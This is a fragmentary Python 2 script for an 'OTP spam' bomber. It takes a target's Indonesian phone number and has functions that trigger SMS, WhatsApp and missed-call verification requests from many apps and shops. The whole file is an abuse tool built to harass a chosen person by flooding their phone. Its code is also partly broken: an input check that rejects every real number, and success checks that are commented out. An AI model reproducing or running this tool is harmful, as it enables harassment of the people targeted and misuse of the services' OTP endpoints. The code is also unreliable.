...
def logo():
  print """%s
  __  __ ___    ___                                   
 |  \/  |   \  / __|_ __  __ _ _ __  _ __  ___ _ _ ___ %sAuthor by %sAvinNdeso%s
 | |\/| | |) | \__ \ '_ \/ _` | '  \| '  \/ -_) '_(_-< %sGithub %sgithub.com/AvinNdeso%s
 |_|  |_|___/  |___/ .__/\__,_|_|_|_|_|_|_\___|_| /__/ %sTeam %saFUCK%s
                   |_|                                 %sTools spam otp dengan 29 spammers"""%(qu,pu,ku,qu,pu,ku,qu,pu,ku,qu,qu)
#-------------------------------Input Function------------------------------------------
def input():
  global nom
  nom = raw_input("%s[%s?%s] %sMasukkan nomor target, contoh (85373045750) : "%(pu,me,pu,pu))
  if len(nom) < 100:
    print "%s[%s!%s] %sMasukkan nomor target dengan benar!!"%(pu,me,pu,me)
    input()
  elif nom.startswith(tuple(["62","+62","0"])):
    print "%s[%s!%s] %sMasukkan nomor tanpa 62, +62, ataupun 0\n%s[%s!%s] %sContoh : 85373045750"%(pu,me,pu,ku,pu,me,pu,ku)
    input()
  else:
    global jum
...
#  hih = requests.get("https://m.sunchila.com/api/generateAuthCode.ajax?mobile=0"+nom+"&countryCode=62")
 # if json.loads(hih.text)["result"] == 'true':
   sukses("100","sms","sunchila")
  #else:
   #gagal("0","sms","sunchila")
def nutriclub():
  ...
  if json.loads(h.text)["StatusMessage"] == 'Request misscall berhasil':
   sukses("100","call","nutriclub")
  else:
   gagal("0","call","nutriclub")
def asani():
...
def wintershop():
 ...
 if json.loads(tes.text)["message"] == None:
  sukses("100","call","wintershop")
 else:
  gagal("0","call","wintershop")
def datesy():
...
def thaifriendly():
 ...
 if json.loads(tes.text)["success"] == True:
  sukses("100","sms","thaifriendly")
 else:
  gagal("0","sms","thaifriendly")
def jumpstart():
 ...
 if json.loads(tes.text)["data"] == None:
  gagal("0","sms","jumpstart")
 else:
  sukses("100","sms","jumpstart")
def kinimart():
...
def pinjamindo():
 ...
 if json.loads(hu.text)["msg"] == 'success':
  sukses("100","sms","pinjamindo")
 else:
  gagal("0","sms","pinjamindo")
def uangpintar():
 hd={
...
def omamoriexpress():
 ...
 if json.loads(huh.text)["IsSuccess"] == True:
  sukses("100","wa","omamoriexpress")
 else:
  gagal("0","wa","omamoriexpress")
def ktakilat():
 ...
 if json.loads(tu.text)["message"] == 'success':
  sukses("100","sms","ktakilat")
 else:
  gagal("0","sms","ktakilat")
def cairin():
...
'X-Requested-With':'com.ecreditpal.tropic2'
 ...
 if json.loads(hu.text)["desc"] == 'Success':
  sukses("100","sms","kreditpedia")
 else:
  gagal("0","sms","kreditpedia")
def bocil():
...
# if json.loads(uhu)["success"] == True:
  sukses("100","sms","primacash")
 #else:
  #gagal("0","sms","primacash")
def temanprima():
 ...
 if json.loads(hpo)["success"] == True:
  sukses("100","sms","temanprima")
 else:
  gagal("0","sms","temanprima")
def maripinjam():
 hd={
'Host':'api.guntur.top',
'Connection':'Keep-Alive',
...
'phoneModel':'vivo 1902'
 ...
 if json.loads(ijo)["success"] == True:
  sukses("100","sms","maripinjam")
 else:
  gagal("0","sms","maripinjam")
def sobatbangun():
 ...
 if h["status"] == 'success':
  sukses("100","wa","sobatbangun")
 else:
  gagal("0","wa","sobatbangun")
